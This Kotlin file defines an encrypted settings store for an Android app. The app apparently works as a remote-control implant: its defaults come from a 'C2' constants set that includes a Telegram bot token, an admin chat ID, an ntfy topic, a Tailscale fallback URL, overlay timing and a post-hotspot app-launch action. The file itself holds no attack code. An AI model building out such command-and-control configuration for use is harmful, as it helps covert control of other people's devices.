package com.systemlinker.base

import android.content.Context
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

class ConfigStore(context: Context) {

    private val masterKey = MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build()

    private val sharedPreferences = EncryptedSharedPreferences.create(
        context,
        Constants.Storage.PREFS_FILE_NAME,
        masterKey,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
    )

    var ntfyTopic: String
        get() = sharedPreferences.getString(Constants.Storage.KEY_NTFY_TOPIC, Constants.C2.NTFY_DEFAULT_TOPIC) ?: Constants.C2.NTFY_DEFAULT_TOPIC
        set(value) = sharedPreferences.edit().putString(Constants.Storage.KEY_NTFY_TOPIC, value).apply()

    var tailscaleUrl: String
        get() = sharedPreferences.getString(Constants.Storage.KEY_TS_URL, Constants.C2.NTFY_DEFAULT_FALLBACK_URL) ?: Constants.C2.NTFY_DEFAULT_FALLBACK_URL
        set(value) = sharedPreferences.edit().putString(Constants.Storage.KEY_TS_URL, value).apply()

    var lastUpdateId: Long
        get() = sharedPreferences.getLong(Constants.Storage.KEY_LAST_UPDATE_ID, 0L)
        set(value) = sharedPreferences.edit().putLong(Constants.Storage.KEY_LAST_UPDATE_ID, value).apply()

    // --- NEW PERSISTENT DYNAMIC CONFIGURATIONS ---

    var botToken: String
        get() = sharedPreferences.getString("bot_token", Constants.C2.TELEGRAM_BOT_TOKEN) ?: Constants.C2.TELEGRAM_BOT_TOKEN
        set(value) = sharedPreferences.edit().putString("bot_token", value).apply()

    var targetChatId: Long
        get() = sharedPreferences.getLong("chat_id", Constants.C2.TELEGRAM_ADMIN_USER_ID)
        set(value) = sharedPreferences.edit().putLong("chat_id", value).apply()

    var overlayDurationMs: Long
        get() = sharedPreferences.getLong("overlay_duration", 3000L) // Default 3 seconds
        set(value) = sharedPreferences.edit().putLong("overlay_duration", value).apply()

    var postHotspotAction: String
        get() = sharedPreferences.getString("post_hs_action", "app_launch") ?: "app_launch"
        set(value) = sharedPreferences.edit().putString("post_hs_action", value).apply()

    var postHotspotArgs: Int
        get() = sharedPreferences.getInt("post_hs_args", 1)
        set(value) = sharedPreferences.edit().putInt("post_hs_args", value).apply()
}